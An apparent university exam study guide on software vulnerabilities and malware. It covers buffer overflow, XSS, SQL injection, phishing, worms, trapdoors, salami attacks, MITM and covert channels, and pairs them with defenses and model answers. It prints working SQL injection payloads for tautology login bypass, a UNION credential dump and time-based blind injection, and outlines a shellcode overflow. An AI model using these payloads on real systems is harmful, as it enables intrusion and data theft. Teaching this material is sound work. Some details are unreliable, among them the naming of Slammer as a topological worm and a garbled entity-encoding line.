``` #### Step 1: Inject a Simple Alert Input: `` Resulting page source: ```html

You searched for:

``` The browser executes the alert. #### Step 2: Cookie Stealing Payload ```html ``` Or, using an image tag (works even if JS is disabled): ```html ``` #### Step 3: Mitigated Solution (Output Encoding) ```php

You searched for:

``` `htmlspecialchars` converts `<` → `<`, `>` → `>`, neutralizing the tag. > [!IMPORTANT] > **KTU Insight:** The defense is **Context-Aware Output Encoding**: use HTML entity encoding for HTML body, JavaScript escaping for inline JS, and URL encoding for URL parameters. A single function is not sufficient. --- ### 3.4 Phishing — Analytical Detection Matrix | Indicator of Phishing (IoP) | Example | Detection Method | |---|---|---| | **Spoofed Display Name** | "PayPal Support" `` | DMARC / SPF check | | **Lookalike Domain** | `paypa1.com` (with digit 1) | Homograph attack detection | | **Urgency / Fear Tone** | "Your account will be suspended in 24 hours" | NLP-based email classification | | **Mismatched URL** | Anchor text "www.bank.com" → href="www.bank1.com" | Link analysis | | **Unusual Sender TLD** | `.ru`, `.tk`, `.xyz` from a bank | Domain reputation scoring | | **HTTP (not HTTPS)** | Login form on `http://` | Certificate validation | > [!NOTE] > **Analytical Note:** Phishing emails exploit **Cialdini's 6 Principles of Persuasion**: reciprocity, commitment, social proof, authority, liking, scarcity. Recognizing these psychological triggers is the foundation of anti-phishing training. --- ### 3.5 Comparative Vulnerability Matrix (CO3 Exam Pattern) | Feature | Buffer Overflow | XSS | SQLi | Phishing | |---|---|---|---|---| | **OWASP Top 10 (2021) Rank** | N/A (memory safety) | A03: Injection | A03: Injection | Social Engineering | | **Attack Layer** | System / Memory | Application (Client) | Application (Server-DB) | Human / Social | | **Primary Target** | Return address / shellcode | Session cookies | Database records | Credentials / Money | | **CIA Impact** | I, A | C, I | C, I | C | | **Detection Difficulty** | Hard (low-level) | Medium (signature + heuristic) | Medium (WAF rules) | Hard (human-dependent) | | **Primary Defense** | Memory-safe languages, ASLR | Output encoding, CSP | Parameterized queries | User training, MFA | ## 4. Structural Diagrams & Schematics ### 4.1 Stack Memory Layout During Function Call ```mermaid graph TD A[HIGH ADDRESS - Function Arguments] --> B[Return Address - 4 bytes] B --> C[Saved Frame Pointer SBP - 4 bytes] C --> D[Local Buffer - 64 bytes - VULNERABLE TARGET] D --> E[Other Locals and Padding] E --> F[LOW ADDRESS - Top of Stack ESP] style A fill:#ffcccc,stroke:#cc0000,color:#000 style B fill:#ffe066,stroke:#cc8800,color:#000 style C fill:#ffe066,stroke:#cc8800,color:#000 style D fill:#ff4d4d,stroke:#990000,color:#fff style E fill:#ccffcc,stroke:#006600,color:#000 style F fill:#cce5ff,stroke:#003366,color:#000 ``` **Legend:** 🔴 **Red** = critical attacker target, 🟡 **Yellow** = overflow-overwritten region, 🟢 **Green** = safe area, 🔵 **Blue** = stack pointer location. --- ### 4.2 Buffer Overflow Attack Lifecycle ```mermaid graph LR A[Step 1: Identify Vulnerable Function - strcpy, gets] --> B[Step 2: Determine Buffer Size - 64 bytes] B --> C[Step 3: Calculate Return Address Offset - 68 bytes padding] C --> D[Step 4: Craft Malicious Payload - NOP sled + Shellcode] D --> E[Step 5: Overwrite Return Address] E --> F[Step 6: Function Returns - EIP Hijacked] F --> G[Step 7: CPU Slides Through NOP Sled] G --> H[Step 8: Shellcode Executes - Root Shell Spawned] style A fill:#e6f3ff,stroke:#0066cc style B fill:#e6f3ff,stroke:#0066cc style C fill:#fff4e6,stroke:#cc6600 style D fill:#ffe6e6,stroke:#cc0000 style E fill:#ffe6e6,stroke:#cc0000 style F fill:#ffcccc,stroke:#990000 style G fill:#ffcccc,stroke:#990000 style H fill:#990000,stroke:#000,color:#fff ``` --- ### 4.3 XSS Attack Flow (Reflected Variant) ```mermaid graph TD A1[Attacker Crafts Malicious URL] --> A2[Embeds script tag in parameter] A2 --> A3[Sends URL to Victim via Email or Chat] A3 --> A4[Victim Clicks Link] A4 --> A5[Browser Sends Request to Vulnerable Server] A5 --> A6[Server Reflects Input Without Sanitization] A6 --> A7[Browser Renders Malicious Script] A7 --> A8[Script Executes in bank.com Origin] A8 --> A9[Cookie / Token Stolen] A9 --> A10[Sent to Attacker Server] A10 --> A11[Attacker Hijacks Session] style A1 fill:#ffcccc,stroke:#990000 style A7 fill:#ff4d4d,stroke:#990000,color:#fff style A8 fill:#cc0000,stroke:#000,color:#fff style A11 fill:#660000,stroke:#000,color:#fff ``` --- ### 4.4 SQL Injection Attack Flow ```mermaid graph TD B1[Attacker Identifies Input Fields] --> B2[Tests with Single Quote] B2 --> B3{Application Returns SQL Error?} B3 -->|Yes| B4[SQLi Confirmed] B3 -->|No| B5[Use Blind SQLi or Time-based] B4 --> B6[Determine Number of Columns - ORDER BY] B6 --> B7[UNION SELECT to Extract Data] B7 --> B8[Query information_schema for Schema] B8 --> B9[Dump Target Tables and Credentials] B5 --> B10[Use IF and SLEEP for Inference] B10 --> B8 style B4 fill:#ff9999,stroke:#990000 style B7 fill:#ff4d4d,stroke:#990000,color:#fff style B9 fill:#990000,stroke:#000,color:#fff ``` --- ### 4.5 Phishing Attack Lifecycle (Cyber Kill Chain Aligned) ```mermaid graph TD C1[Stage 1: Reconnaissance - Harvest Emails] --> C2[Stage 2: Weaponization - Craft Spoofed Email] C2 --> C3[Stage 3: Delivery - Send via Botnet] C3 --> C4[Stage 4: Exploitation - Victim Clicks Link] C4 --> C5[Stage 5: Installation - Credential Page or Malware] C5 --> C6[Stage 6: Command and Control - C2 Server] C6 --> C7[Stage 7: Actions on Objectives - Fraud or Lateral Movement] style C1 fill:#e6f3ff,stroke:#0066cc style C4 fill:#ffe6e6,stroke:#cc0000 style C5 fill:#ff4d4d,stroke:#990000,color:#fff style C7 fill:#660000,stroke:#000,color:#fff ``` --- ### 4.6 Defense-in-Depth Functional Architecture ```mermaid graph TB subgraph APP["Application Layer"] A1[Input Validation] A2[Output Encoding] A3[Parameterized Queries] end subgraph SYS["System Layer"] S1[ASLR - Address Space Layout Randomization] S2[DEP / NX Bit - Non-Execute Stack] S3[Stack Canaries - GCC fstack-protector] end subgraph NET["Network Layer"] N1[Web Application Firewall - WAF] N2[Intrusion Detection System - IDS] end subgraph HUM["Human Layer"] H1[Security Awareness Training] H2[Multi-Factor Authentication - MFA] end APP --> SYS SYS --> NET NET --> HUM style APP fill:#cce5ff,stroke:#003366 style SYS fill:#ccffcc,stroke:#006600 style NET fill:#ffe6cc,stroke:#cc6600 style HUM fill:#ffccff,stroke:#660066 ``` ## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap ### 5.1 Part A Questions (3 Marks Each) > **Q1. [KTU University Exam - Dec 2023, May 2024]** Define software vulnerability. List the four major classes of software vulnerabilities covered in Module 2 of the Information Security syllabus. **Model Answer:** > [!NOTE] > **Definition:** A software vulnerability is a weakness or flaw in a software system that can be exploited by a threat actor to compromise the confidentiality, integrity, or availability of the system or its data. > > **Four Major Classes (Module 2):** > 1. **Buffer and Stack Overflow** — memory-layer vulnerabilities caused by writing beyond buffer boundaries. > 2. **Cross-site Scripting (XSS)** — client-side code injection attacks on web applications. > 3. **SQL Injection (SQLi)** — server-side database query injection attacks. > 4. **Phishing** — social-engineering attacks exploiting human psychology to steal credentials or data. --- > **Q2. [KTU University Exam - May 2023, Dec 2022]** Differentiate between Stack Overflow and Heap Overflow. **Model Answer:** | Parameter | Stack Overflow | Heap Overflow | |---|---|---| | **Memory Region** | Stack segment (local variables, return address) | Heap segment (dynamically allocated memory via `malloc`) | | **Growth Direction** | Stack grows toward lower addresses | Heap grows toward higher addresses | | **Primary Target** | Return address, Saved Frame Pointer | Heap metadata, adjacent heap objects | | **Trigger Function** | `strcpy`, `gets`, `sprintf` | `malloc`/`free` misuse, dangling pointers | | **Mitigation** | Stack canaries, ASLR, DEP | Heap sanitizers, safe allocators, CFI | --- ### 5.2 Part B Question — Internal Choice (14 Marks) --- > **Q3. [KTU University Exam - Dec 2024 Model Paper]** **Part (a) (7 marks):** With a neat diagram, explain the working of a stack-based buffer overflow attack. Describe the role of the **return address**, **saved frame pointer**, and **shellcode** in the attack. > > **Part (b) (7 marks):** Explain **SQL Injection** in detail. Discuss the following with examples: (i) Tautology-based attack, (ii) UNION-based attack, (iii) Blind SQL injection. How can SQL injection be prevented? --- ### **MODEL ANSWER FOR Q3(a) — Stack Buffer Overflow (7 marks)** **Step 1 (2 marks) — Stack Frame Diagram:** A stack frame consists of (from high to low memory): 1. Function arguments 2. **Return Address** (4 bytes) — stores where to resume after function returns 3. **Saved Frame Pointer (SBP/EBP)** (4 bytes) — restores previous frame pointer 4. **Local variables / Buffer** (e.g., 64 bytes for `char buf[64]`) **Step 2 (2 marks) — Vulnerability & Overflow:** When a function uses unsafe functions like `strcpy(buffer, input)` and the user input exceeds the buffer size, the extra bytes overflow into the **SBP** and then **overwrite the Return Address**. **Step 3 (2 marks) — Return Address Hijack & Shellcode Execution:** - The attacker crafts a payload of `N` bytes of padding (where $N = \text{buffer size} + \text{SBP size}$) followed by the address of malicious **shellcode** (often machine instructions for `execve("/bin/sh")`). - When the vulnerable function executes `RET`, the CPU pops the attacker's address into **EIP/RIP**. - Execution jumps to the shellcode, granting the attacker a shell. **Step 4 (1 mark) — Diagram:** *(Refer to Section 4.1)* --- ### **MODEL ANSWER FOR Q3(b) — SQL Injection (7 marks)** **Definition (1 mark):** SQL Injection is a code injection technique that exploits improper input validation in applications, allowing attackers to inject malicious SQL statements into queries executed against the backend database. **Tautology-Based Attack (2 marks):** The attacker injects a condition that is always TRUE: ```sql Username: ' OR '1'='1 Password: anything ``` Resulting query: ```sql SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'; ``` Since `'1'='1'` is always TRUE, the query returns all rows, bypassing authentication. **UNION-Based Attack (2 marks):** The attacker appends a `UNION SELECT` to retrieve data from other tables: ```sql ' UNION SELECT username, password FROM users -- ``` This dumps credentials directly into the application's response. **Blind SQL Injection (1 mark):** When output is not reflected, the attacker uses: - **Boolean-based:** `' AND 1=1 --` (page loads) vs `' AND 1=2 --` (page differs). - **Time-based:** `' OR IF(1=1, SLEEP(5), 0) --` causes a 5-second delay if true. **Prevention (1 mark):** Use **Parameterized Queries / Prepared Statements**: ```php $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?"); $stmt->execute([$user, $pass]); ``` Also enforce **input validation**, **least-privilege database accounts**, and deploy a **WAF**. --- ### **ALTERNATIVE PART B CHOICE** > **Q4. [KTU University Exam - May 2024 Model Paper]** **Part (a) (7 marks):** Explain **Cross-Site Scripting (XSS)** in detail. With suitable diagrams, describe **Reflected XSS** and **Stored XSS**. What is the role of the **Same-Origin Policy** in XSS attacks? > > **Part (b) (7 marks):** What is **Phishing**? Explain the **phishing attack lifecycle** with a diagram. Differentiate between **spear phishing**, **whaling**, **vishing**, and **smishing**. List any **four indicators of a phishing email**. --- ### **MODEL ANSWER FOR Q4(a) — XSS (7 marks)** **Definition (1 mark):** XSS is a client-side code injection attack in which malicious scripts are injected into trusted web applications and executed in the victim's browser, bypassing the Same-Origin Policy (SOP). **Reflected XSS (2 marks):** - The malicious payload is embedded in a URL parameter (e.g., `?search=`). - The server reflects the input back into the HTML response *without sanitization*. - Victim must click the crafted link (often delivered via phishing email). - **Example URL:** `http://site.com/search?q=` **Stored XSS (2 marks):** - The payload is **permanently stored** in the server's database (e.g., a forum comment). - Every user who views the infected page automatically executes the script. - **Severity:** Much higher than reflected XSS — affects all visitors. **Role of Same-Origin Policy (2 marks):** - SOP restricts scripts on `evil.com` from reading cookies of `bank.com`. - However, **XSS-injected scripts run in the context of `bank.com`'s origin** (since they are embedded in bank.com's HTML). - This allows the malicious script to **access cookies, DOM, and local storage** of the trusted origin. - XSS effectively **bypasses the SOP** by making malicious code appear to come from the trusted site. **Prevention:** Output encoding (`htmlspecialchars`), Content Security Policy (CSP), HttpOnly cookie flag. --- ### **MODEL ANSWER FOR Q4(b) — Phishing (7 marks)** **Definition (1 mark):** Phishing is a **social engineering** attack where the attacker impersonates a trusted entity (bank, employer, IT admin) to trick victims into revealing credentials, financial data, or installing malware. **Phishing Attack Lifecycle (2 marks)** — Seven stages (per Lockheed Martin Cyber Kill Chain): 1. **Reconnaissance** — harvesting emails from LinkedIn / data breaches. 2. **Weaponization** — crafting a spoofed email with malicious link / attachment. 3. **Delivery** — sending emails via botnets. 4. **Exploitation** — victim clicks link / opens attachment. 5. **Installation** — credential-harvesting page or malware drop. 6. **Command & Control** — attacker receives stolen data. 7. **Actions on Objectives** — account takeover, fraud, lateral movement. **Phishing Variants (2 marks):** | Variant | Description | |---|---| | **Spear Phishing** | Targeted at a specific individual, uses personal details for credibility. | | **Whaling** | Aimed at C-level executives (CEO, CFO); highly personalized. | | **Vishing** | Voice phishing via phone calls; attacker pretends to be bank/IT. | | **Smishing** | SMS phishing with malicious links. | **Four Indicators of Phishing Email (2 marks):** 1. **Spoofed sender address** (e.g., `paypa1.com` with digit 1). 2. **Generic greeting** ("Dear Customer" instead of user's name). 3. **Urgency or threat** ("Your account will be suspended in 24 hours"). 4. **Mismatched URL** — anchor text shows `bank.com` but href points to `evil.com`. 5. (Bonus) **Spelling and grammatical errors.** 6. (Bonus) **Unexpected attachments** (e.g., `.exe`, `.js`, macro-enabled `.docm`). --- > [!WARNING] > **KTU Examiner's Valuation Warning — Common Mark-Deduction Pitfalls:** > 1. **Conflating SQLi and XSS:** Students often mix up injection contexts. Remember: **SQLi targets the server-side database**; **XSS targets the client-side browser**. > 2. **Missing the "Return Address" in Buffer Overflow:** A 7-mark buffer overflow question without mentioning the *return address overwrite* and *EIP hijack* loses 3 marks minimum. > 3. **Forgetting `--` in SQLi examples:** The SQL comment `--` is essential to neutralize the trailing query — omitting it is a common error. > 4. **Calling XSS a "virus":** XSS is a *code injection attack*, not a virus or worm. Use precise terminology. > 5. **Treating Phishing as purely technical:** Phishing is a *social engineering* attack. KTU expects mention of psychological triggers (urgency, authority, fear). > 6. **No diagram in buffer overflow question:** A stack frame diagram is worth **at least 2 marks** by itself — never skip it. --- ### 5.3 Topic Recap & Important Things to Remember > [!IMPORTANT] > **Rapid Revision Checklist — Module 2 (Software Vulnerabilities)** ### 🔑 Core Concepts to Memorize - [ ] **Buffer Overflow:** Unsafe C functions (`strcpy`, `gets`, `sprintf`) + fixed-size stack buffer = memory corruption. Attack chain: **overflow → SBP corruption → return address overwrite → EIP hijack → shellcode execution**. - [ ] **NOP Sled:** `\x90` padding before shellcode to widen the exploit landing zone. - [ ] **XSS Variants:** Stored (persistent, DB), Reflected (URL), DOM-based (client-side JS). All exploit **Same-Origin Policy** by appearing to originate from the trusted site. - [ ] **SQLi Variants:** In-band (UNION/Error), Blind (Boolean/Time), Out-of-band (DNS/HTTP). Always prevent with **Parameterized Queries** (NOT just input filtering). - [ ] **Phishing Lifecycle:** Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions (Kill Chain 7 stages). - [ ] **Phishing Variants:** Spear (individual), Whaling (executive), Vishing (voice), Smishing (SMS), Pharming (DNS). ### 🛡️ Defense Cheat Sheet | Attack | Primary Defense | Secondary Defense | |---|---|---| | Buffer Overflow | Memory-safe languages, safe functions | ASLR, DEP/NX, Stack canaries, CFI | | XSS | Output encoding (context-aware) | CSP, HttpOnly cookies, WAF | | SQLi | Parameterized queries | Input validation, least privilege, WAF | | Phishing | User awareness training | SPF/DKIM/DMARC, MFA, FIDO2 | ### 📐 Formulas to Remember $$ \text{Padding to RA} = \text{Buffer Size} + \text{Frame Pointer Size} = 64 + 4 = 68 \text{ bytes (32-bit x86)} $$ $$ \text{Stack Direction} = \text{High} \to \text{Low (decreasing addresses)} $$ $$ P_{hit}(\text{NOP sled}) = \frac{L_{NOP}}{L_{NOP} + L_{shellcode}} $$ ### 🧠 High-Yield KTU Buzzwords (Use These in Answers) - **CIA Triad** — Confidentiality, Integrity, Availability - **Same-Origin Policy (SOP)** — Browser security model - **Parameterized Query / Prepared Statement** — SQLi defense - **Output Encoding / Escaping** — XSS defense - **Content Security Policy (CSP)** — XSS defense - **ASLR** — Address Space Layout Randomization - **DEP / NX bit** — Data Execution Prevention - **Social Engineering** — Phishing's foundation - **Cialdini's 6 Principles** — Authority, Urgency, Scarcity, etc. - **Cyber Kill Chain** — 7-stage attack model ### 🎯 KTU 2024 Exam Pattern Mapping | Question Type | Expected Marks | Probability in KTU ESE | |---|---|---| | Define vulnerability + list types | 3 | **Very High** | | Compare two vulnerabilities (table) | 3–7 | **Very High** | | Explain buffer overflow with diagram | 7–14 | **High** | | SQLi variants + prevention | 7 | **High** | | XSS variants + SOP | 7 | **Medium** | | Phishing lifecycle + variants | 7 | **High** | | Case study: identify vulnerability + mitigation | 14 | **Medium** | > [!NOTE] > **Final KTU Tip:** For 14-mark questions, the perfect answer structure is: **Definition (2 marks) → Diagram (3 marks) → Step-by-step mechanism (5 marks) → Examples with code/payload (2 marks) → Prevention/Mitigation (2 marks)**. Practice writing answers in this exact ratio.

topics.title: Malwares - Viruses, Worms and Trojans, Topological Worms, Trapdoors, Salami Attack, Man-in-the-Middle Attacks, Covert Channels
topics.content:
<!-- SECTION_1_START -->
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECST744 - INFORMATION SECURITY
> - **Module:** Module 2
> - **Topic:** Malwares - Viruses, Worms and Trojans, Topological Worms, Trapdoors, Salami Attack, Man-in-the-Middle Attacks, Covert Channels

# 1. Core Technical Definition & Intuitive Overview

## 1.1 What is Malware?

**Malware** (Malicious Software) is any program, code, or script intentionally designed to cause damage, gain unauthorized access, or disrupt the normal functioning of a computer system, network, or its users. The term is an umbrella category that subsumes viruses, worms, trojans, ransomware, spyware, rootkits, and a wide array of covert attack utilities.

> [!IMPORTANT]
> **KTU 2024 Syllabus Anchor:** Malware is treated as the *first* offensive weapons class in Module 2. The examiner frequently tests the *distinction* between propagation mechanism (virus vs. worm) and concealment mechanism (trojan vs. trapdoor).

## 1.2 The Big Picture: A Taxonomy of Malicious Code

Malware is best understood not as a flat list, but as a **two-dimensional classification**:
1. **How it propagates** (replicates itself or rides on a host?)
2. **What payload it delivers** (destruction, espionage, persistence?)

| Axis | Categories | Examples |
|------|-----------|----------|
| Propagation | Self-replicating, Host-dependent, Network-driven | Worm, Virus, Trojan |
| Intent | Destructive, Stealthy, Financial, Espionage | Salami, Trapdoor, Covert Channel |

---

## 1.3 Viruses

### Formal Definition
A **computer virus** is a malicious program that **attaches itself to a legitimate host program or file** and propagates by causing that host to be executed. It cannot spread on its own; it requires user action (opening a file, running a program, booting from an infected disk).

### Intuitive Analogy — The Biological Virus
Just as a **biological flu virus** rides on **droplets and human contact** (it cannot fly to you by itself), a computer virus rides on a **host file or document**. When you *open* the file, you are the equivalent of "sneezing" — the virus gets executed and infects the system.

> [!NOTE]
> **Core Components of a Virus:**
> - **Infection Mechanism** (how it spreads — file infection, boot sector, macro)
> - **Trigger Condition** (logic bomb — a date, event, or count that activates the payload)
> - **Payload** (the malicious action — delete files, corrupt data, exfiltrate info)

### Virus Lifecycle Phases
1. **Dormant Phase** – Virus lies idle, waiting for its trigger.
2. **Propagation Phase** – Virus replicates by attaching to new host files.
3. **Triggering Phase** – The activating event occurs.
4. **Execution Phase** – Payload is delivered.

---

## 1.4 Worms

### Formal Definition
A **computer worm** is a self-replicating, self-propagating malicious program that **spreads over a network without requiring a host file or user intervention**. It exploits vulnerabilities in network services to move autonomously from one machine to another.

### Intuitive Analogy — The Forest Fire
A **forest fire** does not need someone to carry a burning log. It **spreads through the network of trees** (hosts) automatically. A worm behaves the same way: it scans the network for vulnerable systems and ignites them one by one without any human action.

> [!NOTE]
> **Contrast with Virus:**
> - Virus = needs a **host file + user action**
> - Worm = needs only a **network connection + vulnerable service**

---

## 1.5 Trojans (Trojan Horses)

### Formal Definition
A **Trojan horse** is a malicious program disguised as legitimate, useful, or entertaining software. Unlike viruses and worms, it **does not self-replicate**, but it tricks the user into installing it voluntarily, after which it opens backdoors, steals data, or downloads additional malware.

### Intuitive Analogy — The Greek Horse
The **Trojan Horse of Greek mythology** looked like a *gift* (a statue) but concealed **enemy soldiers** inside. A modern Trojan hides **malicious code** inside what appears to be a *free game, anti-virus tool, or system utility*.

> [!WARNING]
> **KTU Pitfall:** Students often classify Trojans as "a type of virus." This is *incorrect*. Trojans are a **separate category** based on the **deception mechanism**, not propagation. They are *non-replicating*.

---

## 1.6 Topological Worms

### Formal Definition
A **topological worm** uses information gathered from the **already-infected victim** (e.g., contact lists, email address books, peer-to-peer file-sharing relationships) to choose its next targets. The attack graph is built by crawling the *social/topology layer* of the network.

### Intuitive Analogy — The Party Inviter
Imagine someone at a party who **only invites friends of friends they just met**, rather than randomly shouting names into a crowd. Topological worms use this strategy — they harvest the **victim's address book** and email everyone there, making infection feel *personal* and bypassing spam filters.

---

## 1.7 Trapdoors (Backdoors)

### Formal Definition
A **trapdoor** (also called a **backdoor**) is a **secret entry point** embedded in a program, system, or hardware that allows bypassing normal authentication. It is typically inserted by the original developer for legitimate debugging/maintenance, but is later exploited by attackers.

### Intuitive Analogy — The Hidden Service Tunnel
Think of a **secured office building**. The front door requires a keycard. But the **janitor's basement tunnel** (built for maintenance) bypasses the security desk entirely. That tunnel is the trapdoor — useful for the janitor, catastrophic when a thief discovers it.

> [!NOTE]
> A trapdoor that grants **elevated, persistent** remote access is called a **backdoor** in modern parlance (e.g., the alleged backdoor in certain network chipsets).

---

## 1.8 Salami Attack

### Formal Definition
A **salami attack** is a financial fraud technique in which an attacker steals **minute, sub-detectable amounts of money** from a large number of accounts or transactions. The individual losses are too small for victims to notice, but the cumulative theft is massive.

### Intuitive Analogy — The Penny Thief
Imagine a bank clerk who **takes one cent from every transaction** they process. No single customer notices losing a cent, but over a million transactions, the clerk walks away with **$10,000**.

> [!IMPORTANT]
> **KTU Classic Example:** A programmer modifies payroll software to **round down** every salary to the nearest cent and deposit the fractional remainder into their own account. This is the canonical "salami attack" answer in KTU exams.

---

## 1.9 Man-in-the-Middle (MITM) Attacks

### Formal Definition
A **Man-in-the-Middle (MITM) attack** is a form of **eavesdropping/interception** in which the attacker secretly relays and possibly alters communications between two parties who believe they are communicating directly with each other.

### Intuitive Analogy — The Letter-Forwarder
**Alice writes to Bob**. But **Mallory** intercepts the letter at the post office, **reads it**, possibly **changes it**, and then **reseals and forwards** it to Bob. Bob thinks the letter came from Alice; Alice thinks Bob received her original message. Mallory is the "man in the middle."

> [!NOTE]
> MITM is not a single attack but a **class of attacks** that breaks the *confidentiality* and *integrity* of communication channels. Common variants: ARP Spoofing, DNS Spoofing, SSL Stripping, Wi-Fi Evil Twin.

---

## 1.10 Covert Channels

### Formal Definition
A **covert channel** is a **hidden communication path** that violates the security policy by enabling the transfer of information between two processes (or principals) that are **not supposed to communicate** according to the system's access control rules.

### Intuitive Analogy — The Prison Tap Code
In a **prison**, inmates are forbidden from talking. However, a **tap on the wall** can encode Morse-like signals. The wall-vibration channel was *not designed* for communication, but it *can* carry information. That is a **covert channel**.

### Two Principal Subtypes
- **Covert Storage Channel** – Hides data in a storage location (e.g., unused fields in a TCP header, file metadata, steganography in images).
- **Covert Timing Channel** – Encodes data in the **timing** of events (e.g., modulating inter-packet delays to send a 0/1 bit stream).

> [!IMPORTANT]
> **KTU Definition Distinction (Frequently Asked):**
> - **Steganography** = hiding the *existence* of a message
> - **Covert Channel** = hiding the *channel* itself, often using system mechanisms the security model never intended as a communication medium

---

## 1.11 Quick Classification Summary

> [!NOTE]
> **At-a-Glance Memory Aid for KTU Board Exam:**
>
> | Malware | Replicates? | Needs User? | Needs Network? | Hidden? |
> |---------|-------------|-------------|----------------|---------|
> | Virus | ✅ (via host) | ✅ | ❌ (typically) | ❌ |
> | Worm | ✅ (self) | ❌ | ✅ | ❌ |
> | Trojan | ❌ | ✅ (to install) | ❌ | ✅ (disguised) |
> | Trapdoor | ❌ | ❌ (already in) | Optional | ✅ (secret entry) |
> | Salami | ❌ | ❌ | ❌ | ✅ (tiny thefts) |
> | MITM | ❌ | ❌ | ✅ | ✅ (relay) |
> | Covert Channel | ❌ | ❌ | Optional | ✅ (channel) |

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Virus — Operational Deep Dive

### How a File Infector Works
1. The virus code is **appended or prepended** to an executable (`.exe`, `.com`).
2. When the host is run, control jumps to the virus code first.
3. The virus **replicates** by seeking new files, then **transfers control back** to the original program so the user sees no anomaly.

### Virus Types (KTU-Mandated)

| Type | Host | Trigger Example |
|------|------|-----------------|
| **File Infector** | `.exe`, `.com`, `.sys` | Running the program |
| **Boot Sector Virus** | MBR / Boot sector | Booting the machine |
| **Macro Virus** | Office documents (.doc, .xls) | Opening the document |
| **Memory-Resident Virus** | Loads into RAM, infects on file access | Stays active after host ends |
| **Polymorphic Virus** | Encrypts itself with a varying key | Each copy looks different to AV |
| **Metamorphic Virus** | Rewrites its own code on each copy | No consistent signature at all |
| **Stealth Virus** | Hides file-size or sector modifications | Intercepts OS calls to lie to AV |

### Trigger Mechanism: Logic Bomb
A **logic bomb** is a piece of code embedded in a program that activates malicious behavior when a **predetermined condition** is met (date, time, user action, file deletion). It is the *trigger*, not the *propagator* — a logic bomb can exist inside a virus, worm, or even legitimate-looking software.

---

## 2.2 Worm — Operational Deep Dive

### Worm Propagation Phases
1. **Reconnaissance / Target Selection** – Choose next victim (random, hit-list, topological, permutation, routable).
2. **Vulnerability Exploitation** – Send exploit payload to the chosen target.
3. **Code Transfer & Execution** – Upload the worm binary to the victim.
4. **Persistence & Replication** – Run the worm, then repeat from step 1.

### Scanning Strategies (High-Yield for KTU)

| Strategy | Mechanism | Speed | Counter-Defense |
|----------|-----------|-------|-----------------|
| **Random Scanning** | Picks IP addresses uniformly at random | Slow, wastes probes | Address blackholing |
| **Routable Scanning** | Restricts to routable, live address blocks | Faster than random | BCP38 filtering |
| **Hit-list Scanning** | Pre-loaded list of vulnerable targets; halves list after each infection | **Extremely fast** (sub-second outbreak) | Rate-limiting at network edge |
| **Topological Scanning** | Uses victim info (address book, P2P neighbors) to pick next target | **Stealthy**, bypasses random filtering | Identity-aware firewalls |
| **Permutation Scanning** | All worms share a permutation of IP space; cooperation avoids redundancy | Efficient and fast | Sinkholing + darknets |

---

## 2.3 Topological Worms — Detailed Mechanism

A topological worm is a **targeted, relationship-driven** propagation model:

- **Information Source:** The compromised host's **local topology** — email address book, IM buddy list, P2P file-sharing peers, social network friends, Bluetooth neighbors, etc.
- **Why it works:** The local topology has *high trust* and *low latency* — emails from a contact are opened; P2P files are downloaded.
- **Bypasses:** Random IP scanning defenses and most spam filters.
- **Real-world example:** **Slammer** (UDP-based) and **Stuxnet** (used topological spread via Siemens STEP 7 project files on USB drives).

### The Propagation Equation
A topological worm's effective reproduction number can be modeled as:

$$R_0 = \beta \cdot \bar{k}$$

where:
- $\beta$ = per-contact transmission probability
- $\bar{k}$ = average number of topology neighbors per host

If $R_0 > 1$, an outbreak occurs.

---

## 2.4 Trapdoors — Operational Deep Dive

### Where Trapdoors Are Hidden
- **Source code of a program** (most common)
- **Compiled binaries** (harder to insert, but possible)
- **Operating system kernels** (e.g., the alleged NSA ANT catalog)
- **Hardware/Firmware** (e.g., management engines, baseband processors)
- **Compiler output** (Ken Thompson's "Reflections on Trusting Trust" — a compiler can insert a backdoor into every program it compiles, even when source is audited)

### Trapdoor vs. Rootkit vs. Backdoor
- **Trapdoor** = *Original design intent* (often for maintenance); now weaponized
- **Backdoor** = *Post-deployment* secret access; often attacker-installed
- **Rootkit** = *Concealment technology* (hides the backdoor/trapdoor from users and AV)

> [!NOTE]
> In KTU valuation, the term "backdoor" is often used interchangeably with "trapdoor." The 2024 syllabus uses **"trapdoor"** as the primary term.

---

## 2.5 Salami Attack — Operational Deep Dive

### Conditions for Success
- **Volume**: High transaction throughput (banks, payrolls, billing systems)
- **Granularity**: Currency supports sub-units (cents, paise)
- **Opacity**: Audit mechanisms don't track fractional residuals
- **Insider Access**: Programmer has write access to financial software

### Common Variants
- **Arithmetic Rounding Exploit** – Round down each transaction
- **Interest Calculation Fraud** – Siphon fractional interest
- **Gas Pump Salami** – Slight over-charging per liter
- **Phone Billing Fraud** – Reroute sub-second call fragments

### Why It Is Hard to Detect
- Individual loss is below **psychological threshold** (≈ $0.01 / event)
- Aggregate loss distributed across millions of accounts
- Transactions appear *individually* legitimate

---

## 2.6 Man-in-the-Middle (MITM) — Operational Deep Dive

### Three Logical Phases
1. **Interception** – Attacker positions themselves in the communication path (ARP spoof, rogue Wi-Fi, DNS poisoning, BGP hijack, malicious proxy).
2. **Decryption** – If traffic is encrypted, attacker may **strip SSL/TLS**, present forged certificates, or use stolen certs.
3. **Forwarding** – Attacker **relays (and possibly modifies)** messages to the legitimate recipient, so neither party notices.

### Common MITM Techniques

| Technique | Layer | Effect |
|-----------|-------|--------|
| **ARP Spoofing** | L2 (LAN) | Attacker claims victim's IP on the LAN |
| **DNS Spoofing / Cache Poisoning** | L7 (DNS) | Resolves domains to attacker's IP |
| **IP Spoofing** | L3 | Pretends to be another host |
| **SSL Stripping** | L7 (HTTPS) | Downgrades HTTPS to HTTP |
| **Evil Twin Wi-Fi** | L1/L2 | Rogue AP with same SSID |
| **BGP Hijack** | Inter-AS routing | Routes entire IP prefix to attacker |
| **Email Header Injection** | SMTP | Reroutes mail via attacker relay |

### Defenses
- **Certificate Pinning** (apps verify server cert)
- **HSTS** (HTTP Strict Transport Security)
- **DNSSEC** (signed DNS responses)
- **VPN with mutual authentication**
- **Mutual TLS** (client + server certs)

---

## 2.7 Covert Channels — Operational Deep Dive

### Covert Storage Channel — Example with TCP
The TCP header has many fields that can carry hidden data:
